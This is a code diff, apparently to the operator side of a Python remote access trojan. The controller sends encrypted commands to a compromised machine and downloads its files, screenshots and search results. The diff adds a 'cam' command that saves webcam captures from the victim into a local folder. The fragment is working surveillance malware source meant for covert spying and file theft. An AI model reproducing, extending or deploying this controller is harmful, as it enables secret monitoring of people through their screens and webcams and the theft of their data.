@@ -96,7 +96,6 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
         dec = decryptor.decrypt(cipher)
         return dec.decode()
 
-
     def r_send(self, msg):
         msg = msg.encode()
         encrypted = "".encode()
@@ -123,8 +122,6 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
             decrypted = self.decrypt(data)
         return decrypted
 
-
-
     def download(self, filename):
         f = open(filename,"wb")
         while(True):
@@ -137,7 +134,6 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
             elif packet.endswith("done".encode()):
                 f.write(packet[:-4])
                 f.close()
-                print("[+] Download completed")
                 break
             f.write(packet)
 
@@ -153,7 +149,6 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
             self.connection.send("[-] File not found".encode())
             print("[-] File not found")
 
-
     def run(self):
         while(True):
             try:
@@ -165,16 +160,24 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                 if cmd[0] == "download":
                     filename = ' '.join(cmd[1:])
                     self.download(filename)
+                    print("[+] Download completed")
                 elif cmd[0] == "upload":
                     self.upload(cmd[1])
-                elif cmd[0] == "clear":
-                    subprocess.call('clear',shell=True)
                 elif cmd[0] == "capture":
                     if not os.path.exists("screenshots"):
                         os.mkdir("screenshots")
                     os.chdir("screenshots")
                     filename = datetime.now().strftime("%m-%d-%Y, %Hh%Mm%Ss") + '.png'
                     self.download(filename)
+                    print("[+] Screenshot captured")
+                    os.chdir("..")
+                elif cmd[0] == "cam":
+                    if not os.path.exists("cam"):
+                        os.mkdir("cam")
+                    os.chdir("cam")
+                    filename = datetime.now().strftime("%m-%d-%Y, %Hh%Mm%Ss") + '.png'
+                    self.download(filename)
+                    print("[+] caamera captured")
                     os.chdir("..")
                 elif cmd[0] == "search" and len(cmd)>1:
                     res = self.r_recv()
